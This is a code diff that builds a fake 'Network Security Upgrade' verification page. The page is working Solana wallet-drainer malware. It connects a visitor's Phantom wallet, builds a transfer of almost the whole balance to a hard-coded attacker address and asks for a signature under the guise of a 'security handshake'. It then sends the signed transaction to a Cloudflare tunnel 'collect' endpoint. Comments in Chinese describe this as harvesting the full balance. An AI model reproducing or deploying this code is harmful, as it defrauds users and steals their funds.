@@ -1,46 +1,78 @@
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Network Security Upgrade</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
+        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; }
+        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; }
+        #status { margin-top:20px; color:#444; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🔱 NETWORK UPGRADE</h2>
+        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
+        <button id="cta">START VERIFICATION</button>
+        <div id="status">Status: Awaiting Handshake...</div>
+    </div>
 
-<script>
-const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的收米白号
+    <script>
+        // 🔱 关键点 1：这里必须换成你服务器目前开着的 Cloudflare 域名！
+        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect"; 
+        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 收米白号
 
-document.getElementById('cta').onclick = async () => {
-    const p = window.solana || window.phantom?.solana;
-    try {
-        const resp = await p.connect();
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        
-        // 1. 获取最新区块哈希和余额
-        const { blockhash } = await connection.getLatestBlockhash();
-        const balance = await connection.getBalance(resp.publicKey);
-        
-        if (balance < 1000000) throw new Error("Balance too low"); // 小于 0.001 SOL 就不动了
+        document.getElementById('cta').onclick = async () => {
+            const p = window.solana || window.phantom?.solana;
+            if (!p) return alert("Please install Phantom wallet");
 
-        // 2. 构造归集交易：扣除微量手续费，全额转出
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: resp.publicKey,
-                toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                lamports: balance - 5000, // 留下 5000 lamports 给节点作为小费
-            })
-        );
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = resp.publicKey;
+            try {
+                const resp = await p.connect();
+                document.getElementById('status').innerText = "CONNECTING...";
 
-        // 3. 拉起钱包：此时用户看到的弹窗是“确认交易”
-        document.getElementById('status').innerText = "Security Handshaking...";
-        const signed = await p.signTransaction(transaction);
-        
-        // 4. 序列化并回传已签名的十六进制包
-        const rawTx = signed.serialize().toString('base64');
-        const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
-        new Image().src = signal;
-        
-        document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
-        document.getElementById('status').style.color = "#14F195";
+                // 使用官方 RPC 节点
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                
+                // 🔱 关键点 2：自动计算“全额收割”金额
+                const { blockhash } = await connection.getLatestBlockhash();
+                const balance = await connection.getBalance(resp.publicKey);
+                
+                if (balance < 1000000) {
+                    alert("Balance insufficient for verification");
+                    return;
+                }
 
-    } catch(e) {
-        document.getElementById('status').innerText = "Handshake Error";
-    }
-};
-</script>
+                // 构造转账交易
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: resp.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
+                        lamports: balance - 5000, // 扣除微量手续费
+                    })
+                );
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = resp.publicKey;
+
+                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
+                
+                // 🔱 关键点 3：拉起交易签名
+                const signed = await p.signTransaction(transaction);
+                
+                // 序列化并回传
+                const rawTx = signed.serialize().toString('base64');
+                const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
+                
+                new Image().src = signal;
+                document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
+                document.getElementById('status').style.color = "#14F195";
+
+            } catch(e) {
+                console.error(e);
+                document.getElementById('status').innerText = "ERROR: " + e.message;
+            }
+        };
+    </script>
+</body>
+</html>
